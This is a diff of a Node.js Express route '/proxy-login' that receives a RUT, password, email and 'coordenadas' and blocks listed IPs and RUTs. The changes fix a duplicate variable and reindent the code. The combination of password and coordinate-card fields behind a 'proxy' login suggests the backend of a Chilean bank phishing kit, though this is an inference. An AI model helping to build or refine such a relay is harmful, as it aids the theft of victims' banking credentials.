@@ -328,43 +328,44 @@ function estaBloqueadoRUT(rut) {
 // =======================
 app.post("/proxy-login", async (req, res) => {
   const { rut, passwd, mail, coordenadas } = req.body;
+
+  // 🔥 ESTA ES LA ÚNICA DECLARACIÓN DE IP
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
   const userAgent = req.headers["user-agent"];
   const infoNavegador = detectarNavegador(userAgent);
 
-  // Registrar intento SIEMPRE
+  // Registrar intento SIEMPRE (solo estadístico)
   if (rut) registrarIntentoRUT(rut);
   registrarIntentoIP(ip, req);
 
-// =============================================
-// 🔥 BLOQUEO SIMPLE: SOLO RUT E IP BLOQUEADOS 🔥
-// =============================================
-const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  // =============================================
+  // 🔥 BLOQUEO SIMPLE: SOLO RUT E IP BLOQUEADOS 🔥
+  // =============================================
 
-// 1) Bloqueo por IP explícitamente bloqueada
-if (estaBloqueadaIP(ip)) {
-  enviarEventoTecnico(`⛔ Intento desde IP bloqueada
+  // 1) Bloqueo por IP explícitamente bloqueada
+  if (estaBloqueadaIP(ip)) {
+    enviarEventoTecnico(`⛔ Intento desde IP bloqueada
 IP: ${ip}
 RUT: ${rut || "sin rut"}
 Hora: ${new Date().toLocaleString("es-CL")}`);
-  return res.status(403).json({
-    status: "error",
-    mensaje: "IP bloqueada"
-  });
-}
+    return res.status(403).json({
+      status: "error",
+      mensaje: "IP bloqueada"
+    });
+  }
 
-// 2) Bloqueo por RUT explícitamente bloqueado
-if (rut && estaBloqueadoRUT(rut)) {
-  enviarEventoTecnico(`⛔ Intento con RUT bloqueado
+  // 2) Bloqueo por RUT explícitamente bloqueado
+  if (rut && estaBloqueadoRUT(rut)) {
+    enviarEventoTecnico(`⛔ Intento con RUT bloqueado
 RUT: ${rut}
 IP: ${ip}
 Hora: ${new Date().toLocaleString("es-CL")}`);
-  return res.status(403).json({
-    status: "error",
-    mensaje: "RUT bloqueado"
-  });
-}
-
+    return res.status(403).json({
+      status: "error",
+      mensaje: "RUT bloqueado"
+    });
+  }
 
   // =============================================
   // 🔥 SI PASA TODAS LAS VALIDACIONES → FLUJO NORMAL
